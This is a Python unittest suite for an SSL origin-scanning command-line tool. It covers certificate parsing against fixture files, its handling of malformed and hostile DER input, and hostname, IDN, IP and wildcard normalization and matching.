"""Tests for cli/ssl_origin_scan.py (stdlib unittest; no Internet access needed).

Run from the repository root:
    python -m unittest discover -s tests/python -v

The integration tests start real TLS servers on 127.0.0.1 (and ::1 when available)
on ephemeral ports, using the test-only fixture keys in tests/fixtures/.
"""

from __future__ import annotations

import base64
import codecs
import contextlib
import csv
import dataclasses
import hashlib
import http.server
import importlib.util
import io
import ipaddress
import json
import os
import re
import shlex
import shutil
import socket
import stat
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Dict, List, Optional, Sequence, Tuple
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]
CLI_PATH = ROOT / 'cli' / 'ssl_origin_scan.py'
FIXTURES = ROOT / 'tests' / 'fixtures'


def _load_cli():
    spec = importlib.util.spec_from_file_location('ssl_origin_scan', str(CLI_PATH))
    module = importlib.util.module_from_spec(spec)
    sys.modules['ssl_origin_scan'] = module  # dataclasses need the module registered
    spec.loader.exec_module(module)
    return module


sos = _load_cli()

EXPECTED = json.loads((FIXTURES / 'expected.json').read_text(encoding='utf-8'))
RENEWED_WILD_SHA256 = '773223c65605a70c8fef4da270b24e8ce1874cf142e64ba827d2ba7ac134003f'
NOW = datetime(2026, 9, 23, 12, 0, 0, tzinfo=timezone.utc)


def fixture_bytes(name: str) -> bytes:
    return (FIXTURES / name).read_bytes()


def fixture_cert(name: str):
    certs, warnings = sos.load_certificates(fixture_bytes(name))
    assert certs, (name, warnings)
    return sos.select_leaf(certs)


def read_json(path: str):
    with open(path, encoding='utf-8') as handle:
        return json.load(handle)


def run_main(*args: str) -> Tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        code = sos.main(list(args))
    return code, out.getvalue(), err.getvalue()


def der_tlv(tag: int, content: bytes) -> bytes:
    """One DER TLV (short or long-form length) for hand-built test structures."""
    if len(content) < 0x80:
        return bytes([tag, len(content)]) + content
    size = len(content).to_bytes((len(content).bit_length() + 7) // 8, 'big')
    return bytes([tag, 0x80 | len(size)]) + size + content


def mini_cert(not_before: bytes = b'20250101000000Z', not_after: bytes = b'20350101000000Z',
              attr_oid: bytes = b'\x55\x04\x03', sig_alg: Optional[bytes] = None) -> bytes:
    """A minimal unsigned certificate (GeneralizedTime validity, one subject attribute)."""
    alg = der_tlv(0x30, der_tlv(0x06, bytes.fromhex('2a8648ce3d040302')))  # ecdsa-with-SHA256
    name = der_tlv(0x30, der_tlv(0x31, der_tlv(0x30, der_tlv(0x06, attr_oid)
                                              + der_tlv(0x0C, b'x.example.com'))))
    spki = der_tlv(0x30, der_tlv(0x30, der_tlv(0x06, bytes.fromhex('2a8648ce3d0201')))
                   + der_tlv(0x03, b'\x00\x04'))
    validity = der_tlv(0x30, der_tlv(0x18, not_before) + der_tlv(0x18, not_after))
    tbs = der_tlv(0x30, der_tlv(0x02, b'\x01') + alg + name + validity + name + spki)
    return der_tlv(0x30, tbs + (alg if sig_alg is None else sig_alg) + der_tlv(0x03, b'\x00'))


def pem_of(der: bytes) -> bytes:
    b64 = base64.b64encode(der).decode('ascii')
    body = '\n'.join(b64[i:i + 64] for i in range(0, len(b64), 64))
    return ('-----BEGIN CERTIFICATE-----\n%s\n-----END CERTIFICATE-----\n' % body).encode('ascii')


def _node_major() -> int:
    node = shutil.which('node')
    if not node:
        return 0
    try:
        text = subprocess.run([node, '--version'], capture_output=True, text=True,
                              timeout=20).stdout
    except (OSError, subprocess.SubprocessError):
        return 0
    match = re.match(r'v(\d+)', text.strip())
    return int(match.group(1)) if match else 0


# normalize_hostname(..., allow_wildcard=True) -> what the web app's normalizeHostname gives
# (new URL: UTS #46 non-transitional). The deviation characters \u00df, \u03c2, ZWJ and
# ZWNJ are where Python's IDNA 2003 codec differs; ideographic full stops separate labels
# (never punycoded into one), and a label mixing directions or starting with a combining
# mark is invalid.
IDN_CASES = {
    'stra\u00dfe.example.com': 'xn--strae-oqa.example.com',
    'STRA\u1e9eE.example.com': 'xn--strae-oqa.example.com',
    'fa\u00df.example.com': 'xn--fa-hia.example.com',
    '*.stra\u00dfe.example.com': '*.xn--strae-oqa.example.com',
    '\u03c2a.example.net': 'xn--a-xmb.example.net',
    'a\u03c2.example.net': 'xn--a-ymb.example.net',
    '\u0915\u094d\u200d.example.com': 'xn--11b6iy14e.example.com',
    '\u0915\u094d\u200c\u0937.example.com': 'xn--11b2ezcs70k.example.com',
    'a\u200db.example.com': None,       # a joiner only after a virama (CONTEXTJ)
    'm\u00fcnchen.example.com': 'xn--mnchen-3ya.example.com',
    '\u00d6RNEK.example.net': 'xn--rnek-4qa.example.net',
    'stra\u00dfe\u3002example.com': 'xn--strae-oqa.example.com',
    'stra\u00dfe\uff61example.com': 'xn--strae-oqa.example.com',
    '*.stra\u00dfe\uff0eexample.com': '*.xn--strae-oqa.example.com',
    '\u03c2a\u3002example.net': 'xn--a-xmb.example.net',
    'www\u3002example\uff0ecom\u3002': 'www.example.com',
    '\u03c2\u05d0.example.com': None,     # a right-to-left letter next to \u03c2
    '\u05d0\u05d1.\u00df.example.com': 'xn--4dbc.xn--zca.example.com',  # label by label
    '\u0301\u00df.example.com': None,     # a leading combining mark
    '\u0301a.example.com': None,
    '\u0391\u03a3\u3002example.com': 'xn--mxa8a.example.com',  # final sigma before an ideographic dot
    '\u0391\u03a3.example.com': 'xn--mxa0b.example.com',
    '*\u3002stra\u00dfe.example.com': None,  # an ideographic dot never makes a wildcard
    'xn--\u00df.example.com': None,       # an ACE prefix on a non-ASCII label
    '\u13a0.example.com': 'xn--58d.example.com',  # Cherokee stays capital (UTS #46)
    '\uab70.example.com': 'xn--58d.example.com',
    '\u13f8a.example.com': 'xn--a-mei.example.com',
    '\u13a0\u00df.example.com': 'xn--zca517g.example.com',
}


# Certificates OpenSSL accepts in a handshake that once crashed the parser with something
# other than DerError: an offset pushing a GeneralizedTime out of range (OverflowError), an
# OID arc beyond Python's int-to-str digit limit (ValueError), and - from a file only - an
# empty signatureAlgorithm SEQUENCE (IndexError).
HOSTILE_DERS = {
    'notAfter 9999123123-0100': mini_cert(not_after=b'9999123123-0100'),
    'notBefore 00010101000000+0100': mini_cert(not_before=b'00010101000000+0100'),
    'huge OID arc': mini_cert(attr_oid=b'\x55' + b'\x81' * 2100 + b'\x01'),
    'empty signatureAlgorithm': mini_cert(sig_alg=der_tlv(0x30, b'')),
}


# ======================================================================= DER parser

class DerParserTests(unittest.TestCase):
    """The built-in X.509 parser against openssl-derived ground truth (expected.json)."""

    def assert_matches_expected(self, cert, expected: Dict, label: str) -> None:
        got = {
            'subjectCN': cert.subject_cn, 'subjectDN': cert.subject_dn,
            'issuerCN': cert.issuer_cn, 'issuerDN': cert.issuer_dn,
            'dnsNames': cert.dns_names, 'ipAddresses': cert.ip_addresses, 'emails': cert.emails,
            'serialHex': cert.serial_hex, 'notBefore': sos.iso_utc(cert.not_before),
            'notAfter': sos.iso_utc(cert.not_after), 'sha256': cert.sha256, 'sha1': cert.sha1,
            'keyAlgorithm': cert.key_algorithm, 'keyBits': cert.key_bits, 'curve': cert.curve,
            'isCA': cert.is_ca, 'selfSigned': cert.self_signed,
        }
        for key, value in got.items():
            with self.subTest(fixture=label, field=key):
                self.assertEqual(value, expected[key])

    def test_all_fixtures_match_expected_json(self):
        self.assertGreaterEqual(len(EXPECTED), 5)
        for name, expected in EXPECTED.items():
            certs, warnings = sos.load_certificates(fixture_bytes(name))
            self.assertEqual(warnings, [], name)
            self.assertEqual(len(certs), 1, name)
            self.assert_matches_expected(certs[0], expected, name)

    def test_parse_certificate_on_raw_der_file(self):
        cert = sos.parse_certificate(fixture_bytes('rsa_multi_san.der'))
        self.assert_matches_expected(cert, EXPECTED['rsa_multi_san.pem'], 'rsa_multi_san.der')
        self.assertEqual(cert.version, 3)
        self.assertEqual(cert.signature_algorithm, 'sha256WithRSAEncryption')
        self.assertEqual(cert.issuer_o, 'Test CA')
        self.assertEqual(cert.subject, {'C': 'TR', 'O': 'Ornek AS',
                                        'CN': 'www.example-test.com.tr'})

    def test_der_file_via_load_certificates(self):
        certs, warnings = sos.load_certificates(fixture_bytes('rsa_multi_san.der'))
        self.assertEqual(warnings, [])
        self.assertEqual(certs[0].sha256, EXPECTED['rsa_multi_san.pem']['sha256'])

    def test_crlf_pem_and_pem_inside_email_text(self):
        for name in ('rsa_multi_san_crlf.pem', 'pasted_with_text.txt'):
            certs, warnings = sos.load_certificates(fixture_bytes(name))
            self.assertEqual(warnings, [], name)
            self.assertEqual([c.sha256 for c in certs], [EXPECTED['rsa_multi_san.pem']['sha256']])

    def test_str_input_is_accepted(self):
        text = fixture_bytes('rsa_multi_san.pem').decode('ascii')
        certs, _ = sos.load_certificates(text)
        self.assertEqual(certs[0].serial_hex, 'f1e2d3c4b5a69788')

    def test_generalized_time_after_2049(self):
        cert = fixture_cert('ec_wildcard.pem')
        self.assertEqual(cert.not_after, datetime(2051, 1, 1, tzinfo=timezone.utc))
        renewed = fixture_cert('cli_renewed_wild.pem')
        self.assertEqual(renewed.not_after, datetime(2052, 1, 1, tzinfo=timezone.utc))
        self.assertEqual(renewed.not_before, datetime(2026, 1, 1, tzinfo=timezone.utc))
        self.assertEqual(renewed.serial_hex, '0a0b0c')
        self.assertEqual(renewed.sha256, RENEWED_WILD_SHA256)
        self.assertEqual(renewed.issuer_o, 'Renewed Test')

    def test_long_form_lengths_and_many_sans(self):
        cert = fixture_cert('many_sans.pem')
        self.assertEqual(len(cert.dns_names), 81)
        self.assertEqual(cert.serial_hex, '7fffffffffffffff01')

    def test_serial_sign_byte_is_stripped(self):
        der = fixture_bytes('rsa_multi_san.der')
        self.assertIn(bytes.fromhex('0209' + '00f1e2d3c4b5a69788'), der)  # DER keeps 00
        self.assertEqual(sos.parse_certificate(der).serial_hex, 'f1e2d3c4b5a69788')

    def test_chains_select_the_leaf_in_any_order(self):
        for name in ('chain.pem', 'chain_reversed.pem', 'cli_chain.p7b', 'cli_chain_p7b.pem'):
            certs, warnings = sos.load_certificates(fixture_bytes(name))
            self.assertEqual(warnings, [], name)
            self.assertEqual(len(certs), 2, name)
            self.assertEqual(sos.select_leaf(certs).subject_cn, 'www.example-test.com.tr', name)

    def test_select_leaf_edge_cases(self):
        self.assertIsNone(sos.select_leaf([]))
        ca = fixture_cert('ca.pem')
        self.assertIs(sos.select_leaf([ca]), ca)  # only a CA: first cert

    def test_private_key_is_reported_not_parsed(self):
        certs, warnings = sos.load_certificates(fixture_bytes('with_key.pem'))
        self.assertEqual(len(certs), 1)
        self.assertEqual([code for code, _ in warnings], ['PRIVATE_KEY_PRESENT'])
        certs, warnings = sos.load_certificates(fixture_bytes('ec_wildcard.key'))
        self.assertEqual(certs, [])
        self.assertEqual([c for c, _ in warnings], ['PRIVATE_KEY_PRESENT', 'NO_CERTIFICATE'])

    def test_pkcs12_is_detected(self):
        certs, warnings = sos.load_certificates(fixture_bytes('cli_bundle.p12'))
        self.assertEqual(certs, [])
        self.assertEqual(warnings[0][0], 'PKCS12_UNSUPPORTED')
        self.assertIn('openssl pkcs12', warnings[0][1])

    def test_csr_is_detected(self):
        pem = '-----BEGIN CERTIFICATE REQUEST-----\nMIIBAA==\n-----END CERTIFICATE REQUEST-----\n'
        certs, warnings = sos.load_certificates(pem)
        self.assertEqual(certs, [])
        self.assertEqual(warnings, [('CSR_NOT_CERT', 'CERTIFICATE REQUEST')])

    def test_bare_base64_der(self):
        b64 = base64.b64encode(fixture_bytes('rsa_multi_san.der')).decode('ascii')
        wrapped = '\n'.join(b64[i:i + 64] for i in range(0, len(b64), 64))
        certs, warnings = sos.load_certificates(wrapped)
        self.assertEqual(warnings, [])
        self.assertEqual(certs[0].serial_hex, 'f1e2d3c4b5a69788')

    def test_garbage_and_empty_input_never_raise(self):
        for data in (b'', b'   \n', b'hello world, not a cert', b'\x30\x03\x02\x01',
                     b'\x30\x82\xff\xff' + b'\x00' * 10, '\u00fcnicode text'.encode('utf-8')):
            certs, warnings = sos.load_certificates(data)
            self.assertEqual(certs, [], data)
            self.assertTrue(warnings, data)
            self.assertIn(warnings[-1][0], ('PARSE_ERROR', 'NO_CERTIFICATE'), data)

    def test_utf16_and_bom_prefixed_text(self):
        # PowerShell 5.1 `Get-Content cert.crt > new-cert.pem` writes UTF-16LE with a BOM
        text = fixture_bytes('cli_renewed_wild.pem').decode('ascii')
        bare = base64.b64encode(fixture_cert('cli_renewed_wild.pem').der).decode('ascii')
        variants = {
            'UTF-16LE with BOM': b'\xff\xfe' + text.encode('utf-16-le'),
            'UTF-16BE with BOM': b'\xfe\xff' + text.encode('utf-16-be'),
            'UTF-16LE without BOM': text.encode('utf-16-le'),
            'UTF-8 with BOM': b'\xef\xbb\xbf' + text.encode('ascii'),
            'bare base64, UTF-16LE with BOM': b'\xff\xfe' + bare.encode('utf-16-le'),
            'bare base64, UTF-8 with BOM': b'\xef\xbb\xbf' + bare.encode('ascii'),
            'str with BOM': '\ufeff' + text,  # text decoded without utf-8-sig
            'bare base64, str with BOM': '\ufeff' + bare,
        }
        for label, data in variants.items():
            with self.subTest(encoding=label):
                certs, warnings = sos.load_certificates(data)
                self.assertEqual(warnings, [])
                self.assertEqual([c.sha256 for c in certs], [RENEWED_WILD_SHA256])
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'new-cert.pem')
            Path(path).write_bytes(variants['UTF-16LE with BOM'])
            leaf, _ = sos.load_new_certificate(path, NOW)
        self.assertEqual(leaf.sha256, RENEWED_WILD_SHA256)
        for name in ('rsa_multi_san.der', 'chain_der.p7b', 'cli_chain.p7b'):  # DER untouched
            with self.subTest(fixture=name):
                certs, warnings = sos.load_certificates(fixture_bytes(name))
                self.assertTrue(certs)
                self.assertEqual(warnings, [])

    def test_bad_base64_inside_pem(self):
        pem = '-----BEGIN CERTIFICATE-----\n!!!notbase64!!!\n-----END CERTIFICATE-----'
        certs, warnings = sos.load_certificates(pem)
        self.assertEqual(certs, [])
        self.assertEqual(warnings[0][0], 'PARSE_ERROR')

    def test_truncated_der_raises_der_error(self):
        der = fixture_bytes('rsa_multi_san.der')
        for cut in (0, 1, 2, 4, 50, len(der) // 2, len(der) - 1):
            with self.subTest(cut=cut):
                with self.assertRaises(sos.DerError):
                    sos.parse_certificate(der[:cut])

    def test_trailing_bytes_are_ignored_for_fingerprint(self):
        der = fixture_bytes('rsa_multi_san.der')
        cert = sos.parse_certificate(der + b'\x00\x00garbage')
        self.assertEqual(cert.sha256, EXPECTED['rsa_multi_san.pem']['sha256'])
        self.assertEqual(cert.der, der)

    def test_indefinite_and_oversized_lengths_are_rejected(self):
        with self.assertRaisesRegex(sos.DerError, 'indefinite'):
            sos.parse_certificate(b'\x30\x80\x00\x00')
        with self.assertRaisesRegex(sos.DerError, 'too long'):
            sos.parse_certificate(b'\x30\x85\x00\x00\x00\x00\x01\x00')
        with self.assertRaisesRegex(sos.DerError, 'exceeds'):
            sos.parse_certificate(b'\x30\x05\x00')
        with self.assertRaises(sos.DerError):
            sos.parse_certificate(b'\x04\x00')  # not a SEQUENCE

    def test_high_tag_number_form_is_skipped(self):
        tlv = sos._read_tlv(b'\x1f\x81\x01\x01\xaa', 0, 5)
        self.assertEqual(tlv[2:], (4, 5))
        with self.assertRaises(sos.DerError):
            sos._read_tlv(b'\x1f\x81\x81\x81\x81\x01\x00', 0, 7)

    def test_oid_decoding(self):
        self.assertEqual(sos._decode_oid(bytes.fromhex('2a864886f70d010101')),
                         '1.2.840.113549.1.1.1')
        self.assertEqual(sos._decode_oid(bytes.fromhex('551d11')), '2.5.29.17')
        self.assertEqual(sos._decode_oid(bytes.fromhex('8837')), '2.999')
        with self.assertRaises(sos.DerError):
            sos._decode_oid(b'')
        with self.assertRaises(sos.DerError):
            sos._decode_oid(b'\x2a\x86')
        # a 2.25 UUID arc (128 bits) is fine; an arc past Python's int-to-str limit is not
        uuid_arc = 2 ** 128 - 1
        encoded = bytes([0x80 | (uuid_arc >> (7 * i) & 0x7F) for i in range(18, 0, -1)])
        self.assertEqual(sos._decode_oid(b'\x69' + encoded + bytes([uuid_arc & 0x7F])),
                         '2.25.%d' % uuid_arc)
        with self.assertRaisesRegex(sos.DerError, 'arc too large'):
            sos._decode_oid(b'\x2b' + b'\xff' * 2100 + b'\x7f')

    def test_time_parsing(self):
        utc, gen = 0x17, 0x18
        cases = [
            (utc, b'491231235959Z', datetime(2049, 12, 31, 23, 59, 59, tzinfo=timezone.utc)),
            (utc, b'500101000000Z', datetime(1950, 1, 1, tzinfo=timezone.utc)),
            (utc, b'2501010000Z', datetime(2025, 1, 1, tzinfo=timezone.utc)),
            (gen, b'20510101000000Z', datetime(2051, 1, 1, tzinfo=timezone.utc)),
            (gen, b'20250101000000.5Z', datetime(2025, 1, 1, 0, 0, 0, 500000,
                                                 tzinfo=timezone.utc)),
            (gen, b'20250101030000+0300', datetime(2025, 1, 1, tzinfo=timezone.utc)),
            (gen, b'20241231210000-0300', datetime(2025, 1, 1, tzinfo=timezone.utc)),
            (gen, b'99991231235959Z', datetime(9999, 12, 31, 23, 59, 59, tzinfo=timezone.utc)),
        ]
        for tag, raw, expected in cases:
            with self.subTest(raw=raw):
                self.assertEqual(sos._parse_time(tag, raw), expected)
        for tag, raw in ((utc, b'251301000000Z'), (gen, b'2025'), (utc, b'abc'),
                         (gen, b'20250230000000Z'), (0x04, b'20250101000000Z'),
                         (utc, b'\xff\xfe'), (gen, b'9999123123-0100'),
                         (gen, b'00010101000000+0100'), (gen, b'20250101000000+2599'),
                         (gen, b'20250101000000+0160')):
            with self.subTest(raw=raw):
                with self.assertRaises(sos.DerError):
                    sos._parse_time(tag, raw)

    def test_hostile_certificates_raise_der_error_only(self):
        self.assertEqual(sos.parse_certificate(mini_cert()).subject_cn, 'x.example.com')
        for label, der in HOSTILE_DERS.items():
            with self.subTest(cert=label):
                with self.assertRaises(sos.DerError):
                    sos.parse_certificate(der)
                for data in (der, pem_of(der)):
                    certs, warnings = sos.load_certificates(data)  # never raises
                    self.assertEqual(certs, [])
                    self.assertEqual([code for code, _ in warnings], ['PARSE_ERROR'])
        with self.assertRaisesRegex(sos.DerError, 'empty signatureAlgorithm'):
            sos.parse_certificate(b'\x30\x08\x30\x00\x30\x00\x03\x02\x00\x00')

    def test_unexpected_parser_errors_become_warnings(self):
        der = fixture_cert('ec_wildcard.pem').der
        with mock.patch.object(sos, 'parse_certificate', side_effect=IndexError('bug')):
            certs, warnings = sos.load_certificates(der)
        self.assertEqual((certs, warnings), ([], [('PARSE_ERROR', 'bug')]))

    def test_ip_san_formatting(self):
        self.assertEqual(sos._format_ip_bytes(bytes([10, 0, 0, 5])), '10.0.0.5')
        self.assertEqual(sos._format_ip_bytes(bytes.fromhex('20010db8' + '00' * 11 + '01')),
                         '2001:db8::1')
        self.assertEqual(sos._format_ip_bytes(bytes.fromhex('00' * 10 + 'ffff' + '01020304')),
                         '::ffff:1.2.3.4')
        self.assertEqual(sos._format_ip_bytes(bytes.fromhex('0a000000ffffff00')),
                         '0a000000ffffff00')

    def test_dn_escaping(self):
        self.assertEqual(sos._escape_dn_value('a,b+c"d\\e<f>g;h'),
                         'a\\,b\\+c\\"d\\\\e\\<f\\>g\\;h')
        self.assertEqual(sos._escape_dn_value('#lead'), '\\#lead')
        self.assertEqual(sos._escape_dn_value(' both '), '\\ both\\ ')
        self.assertEqual(sos._escape_dn_value('\u00d6rnek A.\u015e.'), '\u00d6rnek A.\u015e.')

    def test_string_types(self):
        self.assertEqual(sos._decode_string(0x0C, 'T\u00fcrk'.encode('utf-8')), 'T\u00fcrk')
        self.assertEqual(sos._decode_string(0x1E, 'ab'.encode('utf-16-be')), 'ab')
        self.assertEqual(sos._decode_string(0x1C, 'ab'.encode('utf-32-be')), 'ab')
        self.assertEqual(sos._decode_string(0x14, b'\xe9'), '\u00e9')
        self.assertIsNone(sos._decode_string(0x04, b'x'))

    def test_hostnames_and_cn_fallback(self):
        self.assertEqual(fixture_cert('cn_only.pem').hostnames, ['legacy.example.org'])
        self.assertEqual(fixture_cert('ca.pem').hostnames, [])  # CN with spaces
        self.assertEqual(fixture_cert('ec_wildcard.pem').hostnames,
                         ['*.wild.example.net', 'wild.example.net'])

    def test_to_dict(self):
        cert = fixture_cert('rsa_multi_san.pem')
        data = cert.to_dict(NOW)
        self.assertEqual(data['notAfter'], '2034-06-01T00:00:00.000Z')
        self.assertEqual(data['daysLeft'], (datetime(2034, 6, 1, tzinfo=timezone.utc) - NOW).days)
        self.assertEqual(data['issuerO'], 'Test CA')
        self.assertEqual(data['ipAddresses'], ['10.0.0.5', '2001:db8::1'])
        self.assertNotIn('der', data)
        json.dumps(data)  # serialisable

    def test_days_left_and_labels(self):
        cert = fixture_cert('cn_only.pem')
        self.assertEqual(cert.days_left(datetime(2034, 12, 31, tzinfo=timezone.utc)), 1)
        self.assertEqual(cert.days_left(datetime(2035, 1, 2, tzinfo=timezone.utc)), -1)
        self.assertEqual(cert.short_label(), 'legacy.example.org')
        self.assertEqual(cert.issuer_label(), 'legacy.example.org (Legacy)')
        self.assertEqual(fixture_cert('ec_wildcard.pem').issuer_label(), '*.wild.example.net')

    def test_real_world_certificates_if_present(self):
        paths = sorted(FIXTURES.glob('real_*.pem'))
        if not paths:
            self.skipTest('no real_*.pem fixtures')
        for path in paths:
            text = path.read_text(encoding='ascii')
            blocks = re.findall(r'-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----',
                                text, re.S)
            certs, warnings = sos.load_certificates(text)
            self.assertEqual(warnings, [], path.name)
            self.assertEqual(len(certs), len(blocks), path.name)
            for block, cert in zip(blocks, certs):
                der = base64.b64decode(''.join(block.split()))
                self.assertEqual(cert.sha256, hashlib.sha256(der).hexdigest())
                self.assertTrue(cert.hostnames or cert.is_ca, path.name)
                self.assertLess(cert.not_before, cert.not_after)


# ================================================================ names & coverage

class HostnameTests(unittest.TestCase):

    def test_normalize_hostname(self):
        cases = {
            'WWW.Example.COM': 'www.example.com',
            'https://user:pw@api.example.com:8443/path?q=1#x': 'api.example.com',
            'example.com.': 'example.com',
            'm\u00fcnchen.example-test.com.tr': 'xn--mnchen-3ya.example-test.com.tr',
            '_dmarc.example.com': '_dmarc.example.com',
            'localhost': 'localhost',
            '  spaced.example.com  ': 'spaced.example.com',
        }
        for raw, expected in cases.items():
            with self.subTest(raw=raw):
                self.assertEqual(sos.normalize_hostname(raw), expected)
        for raw in ('', ' ', '10.0.0.1', '::1', '[2001:db8::1]', 'a..b', '-a.com', 'a-.com',
                    'a b.com', '*.example.com', 'x' * 64 + '.com', 'host:port',
                    '.'.join(['a' * 63] * 4) + '.com', 'exa$mple.com',
                    # numeric forms the system resolver turns into an IPv4 address
                    '2026092401', '127.1', '0x7f.0x1', '0X7F.0X1.', '0177.0.0.1', '0x7f000001',
                    'host.123', '\uff11\uff12\uff17\uff0e\uff11', 'https://2026092401:443/x'):
            with self.subTest(raw=raw):
                self.assertIsNone(sos.normalize_hostname(raw))
        # numbers inside a name are fine as long as the top-level label is not numeric
        for raw in ('1password.com', '123.example.com', 'deadbeef', 'x.0x10', 'web-01.example.com'):
            with self.subTest(raw=raw):
                self.assertEqual(sos.normalize_hostname(raw), raw)

    def test_idn_deviation_characters_follow_uts46_like_the_web_app(self):
        # IDNA 2003 (Python's 'idna' codec) would give strasse / σ / drop the joiners:
        # another registrable name than the one the certificate and the web app carry
        for raw, expected in IDN_CASES.items():
            with self.subTest(raw=raw):
                self.assertEqual(sos.normalize_hostname(raw, allow_wildcard=True), expected)
        self.assertEqual(sos.parse_names_text('straße.example.com\n')[0],
                         ['xn--strae-oqa.example.com'])
        resolver = RecordingResolver({'xn--strae-oqa.example.com': ['192.0.2.10']})
        servers, _ = sos.load_targets(['straße.example.com'], resolver=resolver)
        self.assertEqual(resolver.calls, ['xn--strae-oqa.example.com'])
        self.assertEqual(servers[0].ips, ['192.0.2.10'])

    @unittest.skipUnless(_node_major() >= 22, 'needs Node 22+ to run assets/js/lib/domain.js')
    def test_idn_cases_match_the_web_app(self):
        script = ('import { normalizeHostname } from %s;\n'
                  'const cases = JSON.parse(process.argv[1]);\n'
                  'console.log(JSON.stringify(cases.map((c) => normalizeHostname(c, '
                  '{ allowWildcard: true }))));\n'
                  % json.dumps((ROOT / 'assets' / 'js' / 'lib' / 'domain.js').as_uri()))
        cases = list(IDN_CASES)
        proc = subprocess.run([shutil.which('node'), '--input-type=module', '-e', script,
                               json.dumps(cases)], capture_output=True, text=True,
                              encoding='utf-8', timeout=60, cwd=str(ROOT))
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(dict(zip(cases, json.loads(proc.stdout))), IDN_CASES)

    def test_normalize_hostname_wildcards(self):
        self.assertEqual(sos.normalize_hostname('*.Example.com', allow_wildcard=True),
                         '*.example.com')
        self.assertIsNone(sos.normalize_hostname('*.*.example.com', allow_wildcard=True))
        self.assertIsNone(sos.normalize_hostname('w*.example.com', allow_wildcard=True))
        self.assertIsNone(sos.normalize_hostname('*', allow_wildcard=True))

    def test_normalize_ip(self):
        self.assertEqual(sos.normalize_ip(' 10.0.0.1 '), '10.0.0.1')
        self.assertEqual(sos.normalize_ip('2001:DB8:0:0:0:0:0:1'), '2001:db8::1')
        self.assertEqual(sos.normalize_ip('[2001:db8::1]'), '2001:db8::1')
        self.assertEqual(sos.normalize_ip('fe80::1%eth0'), 'fe80::1')
        self.assertEqual(sos.normalize_ip('::ffff:10.0.0.1'), '::ffff:10.0.0.1')
        self.assertEqual(sos.normalize_ip('2001:db8::01'), '2001:db8::1')  # IPv6 groups: fine
        for raw in ('10.0.0.256', 'example.com', '', '1.2.3', '10.0.0.1/24',
                    # a leading zero is octal for inet_aton: ambiguous on every Python version
                    '010.0.0.1', '10.0.0.01', '::ffff:010.0.0.1'):
            self.assertIsNone(sos.normalize_ip(raw), raw)

    def test_leading_zeros_are_refused_even_where_python_accepts_them(self):
        real = ipaddress.ip_address
        real_network = ipaddress.ip_network

        def decimal(text):  # Python < 3.8.12 / 3.9.5 read "010" as decimal 10
            if isinstance(text, str) and ':' not in text:
                head, sep, tail = text.partition('/')
                text = '.'.join(str(int(p)) if p.isdigit() else p for p in head.split('.'))
                text += sep + tail
            return text

        with mock.patch.object(sos.ipaddress, 'ip_address', lambda t: real(decimal(t))), \
                mock.patch.object(sos.ipaddress, 'ip_network',
                                  lambda t, strict=True: real_network(decimal(t), strict)):
            self.assertEqual(sos.normalize_ip('10.0.0.1'), '10.0.0.1')
            for text in ('010.0.0.1', '10.0.0.01', '0177.0.0.1'):
                self.assertIsNone(sos.normalize_ip(text), text)
            self.assertIsNone(sos.expand_ip_block('010.0.0.0/30'))
            self.assertIsNone(sos.parse_exclude_token('010.0.0.1'))
            self.assertIsNone(sos.parse_exclude_token('010.0.0.0/24'))
            self.assertEqual(sos.expand_ip_block('10.0.0.0/30'), ['10.0.0.1', '10.0.0.2'])
        self.assertTrue(sos._has_ambiguous_ipv4_part('::ffff:010.0.0.1'))
        self.assertFalse(sos._has_ambiguous_ipv4_part('2001:db8::01'))
        self.assertFalse(sos._has_ambiguous_ipv4_part('10.0.0.0/8'))

    def test_is_scannable_ip(self):
        self.assertTrue(sos.is_scannable_ip('10.0.0.1'))
        self.assertTrue(sos.is_scannable_ip('::1'))
        self.assertTrue(sos.is_scannable_ip('::ffff:10.0.0.1'))
        self.assertTrue(sos.is_scannable_ip('198.51.100.7'))
        for ip in ('0.0.0.0', '::', '224.0.0.1', 'ff02::1', '255.255.255.255',
                   # 0.0.0.0/8 "this network" (0.0.0.0 dials the local host on Linux)
                   '0.0.14.16', '0.1.2.3', '0.255.255.255',
                   # IPv4-mapped IPv6 is dialled as IPv4: judged by its IPv4 address
                   '::ffff:0.0.0.0', '::ffff:0.1.2.3', '::ffff:224.0.0.1', '::ffff:255.255.255.255'):
            self.assertFalse(sos.is_scannable_ip(ip), ip)
        inv = sos.parse_inventory('zero 0.0.14.16\nweb 10.0.0.1\n')
        self.assertEqual(list(servers_by_name(inv)), ['web'])
        self.assertIn('0.0.0.0/8', str(inv.warnings[0]))

    def test_wildcard_matches_rfc6125(self):
        yes = [('*.a.com', 'x.a.com'), ('*.A.com', 'X.a.COM'), ('*.a.com.', 'x.a.com'),
               ('*.wild.example.net', 'ssl-origin-scan-wildcard-probe.wild.example.net')]
        no = [('*.a.com', 'a.com'), ('*.a.com', 'x.y.a.com'), ('*.com', 'a.com'),
              ('w*.a.com', 'www.a.com'), ('*.*.a.com', 'x.y.a.com'), ('a.com', 'a.com'),
              ('*.a.com', '*.a.com'), ('*.a.com', 'xa.com'), ('*.', 'a'), ('*.a.com', '.a.com')]
        for pattern, host in yes:
            self.assertTrue(sos.wildcard_matches(pattern, host), (pattern, host))
        for pattern, host in no:
            self.assertFalse(sos.wildcard_matches(pattern, host), (pattern, host))

    def test_cert_covers(self):
        names = ['example.com', '*.example.com', 'www.other.org']
        self.assertEqual(sos.cert_covers(names, 'example.com'), (True, 'example.com'))
        self.assertEqual(sos.cert_covers(names, 'API.example.com.'), (True, '*.example.com'))
        self.assertEqual(sos.cert_covers(names, 'www.other.org'), (True, 'www.other.org'))
        self.assertEqual(sos.cert_covers(names, 'a.b.example.com'), (False, None))
        self.assertEqual(sos.cert_covers([], 'example.com'), (False, None))
        # an exact SAN wins over a wildcard even when listed later
        self.assertEqual(sos.cert_covers(['*.example.com', 'www.example.com'], 'www.example.com'),
                         (True, 'www.example.com'))

    def test_cert_covers_with_fixture(self):
        cert = fixture_cert('rsa_multi_san.pem')
        self.assertEqual(cert.covers('x.cdn.example-test.com.tr'),
                         (True, '*.cdn.example-test.com.tr'))
